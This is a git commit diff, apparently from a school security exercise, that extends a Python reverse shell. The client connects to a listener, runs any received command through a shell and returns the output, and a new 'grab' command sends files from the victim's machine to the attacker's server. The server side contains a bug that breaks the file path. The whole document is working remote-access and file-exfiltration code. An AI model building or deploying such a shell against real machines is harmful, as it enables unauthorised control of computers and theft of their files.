e8d9d78a8cfffcef3ca0a956989d051ee4b35473
root <root@CG-JKYJ992.cottpr.portsmouth.sch.uk>
2020-11-19 12:49:59 +0000

    V1

--- tcpClient.py
+++ tcpClient.py
@@ -1,5 +1,18 @@
 import socket
 import subprocess # See video https://www.youtube.com/watch?v=2Fp1N6dof0Y
+import os
+
+def transfer(s, path):
+    if os.path.exists(path):
+        f = open(path, 'rb')
+        packet = f.read(1024)
+        while len(packet) > 0:
+            s.send(packet)
+            packet = f.read(1024)
+        s.send("DONE".encode())
+    else:
+        s.send("File not found".encode())
+
 
 def connect():
     s = socket.socket()
@@ -9,11 +22,20 @@ def connect():
         if "terminate" in command.decode():
             s.close()
             break
+        elif 'grab' in command.decode():
+            grab, path = command.decode().split("*")
+            try:
+                transfer(s, path)
+            except:
+                pass
         else:
             # See the video above which explains how the subprocess element works
             # A pipe has two endpoints
             CMD = subprocess.Popen(command.decode(), shell = True, stdout = subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            
+            #Capture the standout and send the output to the server
             s.send(CMD.stdout.read())
+            # Capture any command errors and send the 
             s.send(CMD.stderr.read())
 
 def main():
--- tcpserver.py
+++ tcpserver.py
@@ -1,23 +1,47 @@
+import os
 import socket
 #  Test if its running netstat -antp | grep 8080
 #  on windows netstat -ano
-s = socket.socket()
-s.bind(("10.174.15.6", 8080))
-s.listen(1)
-conn, addr = s.accept()
-print ("[+] We got a connection from",addr)
+
+def transfer(conn, command):
+        conn.send(command.encode())
+        path = command.split("*")
+        f=open("/root/Desktop/"+path, "wb")
+        while True:
+                bits = conn.recv(1024)
+                if bits.endswith("DONE".encode()):
+                        f.write(bits[:-4])
+                        f.close()
+                        print("[+] Transfer completed")
+                        break
+                if "File not found".encode() in bits:
+                        print("[-] Unable to find oy the file")
+                        break
+                f.write(bits)
+
+def connect():
+        print("[+] - Attempting to connect to server connection...")
+        s = socket.socket()
+        s.bind(("10.174.15.6", 8080))
+        s.listen(1)
+        conn, addr = s.accept()
+        print ("[+] We got a connection from",addr)
     
-while True:
-        command = input("Shell>")
-        if "terminate" in command:
-            conn.send("terminate".encode())
-            conn.close()
-            break
-        else:
-            conn.send(command.encode())
-            print (conn.recv(1024).decode())
-def main ():
-    connect()
+        while True:
+                command = input("Shell>")
+                if "terminate" in command:
+                        conn.send("terminate".encode())
+                        conn.close()
+                        break
+                if command == "":
+                        print("You need to enter something!")
+                elif 'grab' in command:
+                        transfer(conn, command)
+                else:
+                        conn.send(command.encode())
+                        print (conn.recv(1024).decode())
+def main():
+        connect()
     
 main()
     
